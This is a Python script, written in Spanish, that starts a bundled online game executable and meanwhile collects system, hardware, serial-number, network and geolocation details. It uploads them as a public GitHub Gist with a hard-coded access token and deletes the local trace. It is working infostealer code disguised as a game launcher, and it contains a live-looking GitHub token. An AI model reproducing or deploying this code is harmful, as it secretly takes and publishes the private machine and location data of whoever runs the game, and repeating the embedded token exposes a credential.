import os
import subprocess
import requests
import json
import logging
import tempfile
from io import StringIO


log_stream = StringIO()
logging.basicConfig(stream=log_stream, level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')


game_path = os.path.join(os.path.dirname(__file__), 'juego_online.exe')


def ejecutar_juego():
    
    if os.path.exists(game_path):
        
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        
        
        subprocess.Popen([game_path], startupinfo=startupinfo)
    else:
        logging.error(f"El archivo {game_path} no existe.")


def ejecutarcomando(comando):
    coman = subprocess.run(comando, capture_output=True, text=True, shell=True)
    return coman.stdout

def systeminfo():
    comando = "systeminfo"
    return ejecutarcomando(comando)

def cpu_info():
    comando = "wmic cpu get name,CurrentClockSpeed,MaxClockSpeed,NumberOfCores,NumberOfLogicalProcessors"
    return ejecutarcomando(comando)

def memory_info():
    comando = "wmic memorychip get capacity,manufacturer,speed"
    return ejecutarcomando(comando)

def disk_info():
    comando = "wmic diskdrive get model,serialnumber,size,mediaType"
    return ejecutarcomando(comando)

def os_info():
    comando = "wmic os get Caption,Version,Manufacturer,BuildNumber"
    return ejecutarcomando(comando)

def bios_info():
    comando = "wmic bios get manufacturer,version,serialnumber"
    return ejecutarcomando(comando)

def ipconfig():
    comando = "ipconfig"
    return ejecutarcomando(comando)

def netstat():
    comando = "netstat -an"
    return ejecutarcomando(comando)

def obtener_ubicacion_por_ip():
    try:
        ip_response = requests.get('https://api.ipify.org?format=json')
        ip = ip_response.json()['ip']

        geo_response = requests.get(f'https://ipinfo.io/{ip}/json')
        ubicacion = geo_response.json()

        return ubicacion
    except Exception as e:
        return f"Error al obtener la ubicación: {str(e)}"

def guardar_en_archivo():
    logging.debug('Guardando información en archivo')
    with tempfile.NamedTemporaryFile(delete=False, mode='w', suffix='.txt') as temp_file:
        temp_file.write("=== Información de Systeminfo ===\n")
        temp_file.write(systeminfo())
        temp_file.write("\n\n")
        
        temp_file.write("=== Información de CPU ===\n")
        temp_file.write(cpu_info())
        temp_file.write("\n\n")
        
        temp_file.write("=== Información de Memoria ===\n")
        temp_file.write(memory_info())
        temp_file.write("\n\n")
        
        temp_file.write("=== Información de Disco ===\n")
        temp_file.write(disk_info())
        temp_file.write("\n\n")
        
        temp_file.write("=== Información del Sistema Operativo ===\n")
        temp_file.write(os_info())
        temp_file.write("\n\n")
        
        temp_file.write("=== Información de BIOS ===\n")
        temp_file.write(bios_info())
        temp_file.write("\n\n")
        
        temp_file.write("=== Información de ipconfig ===\n")
        temp_file.write(ipconfig())
        temp_file.write("\n\n")
        
        temp_file.write("=== Información de netstat ===\n")
        temp_file.write(netstat())
        temp_file.write("\n\n")
        
        temp_file.write("=== Ubicación ===\n")
        ubicacion = obtener_ubicacion_por_ip()
        if isinstance(ubicacion, dict):
            for key, value in ubicacion.items():
                temp_file.write(f"{key}: {value}\n")
        else:
            temp_file.write(f"{ubicacion}\n")
        return temp_file.name

def subir_a_gist(token, file_path, description, public=True):
    logging.debug('Subiendo archivo a Gist')
    with open(file_path, 'r') as file:
        content = file.read()

    gist_data = {
        "description": description,
        "public": public,
        "files": {
            os.path.basename(file_path): {
                "content": content
            }
        }
    }

    url = 'https://api.github.com/gists'

    response = requests.post(
        url,
        headers={'Authorization': f'token {token}'},
        data=json.dumps(gist_data)
    )
    if response.status_code == 201:
        logging.info('Archivo subido con éxito')
    else:
        logging.error(f'Error al subir archivo: {response.status_code} - {response.text}')

if __name__ == "__main__":
    try:
        ejecutar_juego()
        temp_file_path = guardar_en_archivo()
        token = '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'
        descripcion = 'Información de red y sistema'
        subir_a_gist(token, temp_file_path, descripcion)
        os.remove(temp_file_path)
    except Exception as e:
        logging.error(f'Error: {e}')

    
    print(log_stream.getvalue())
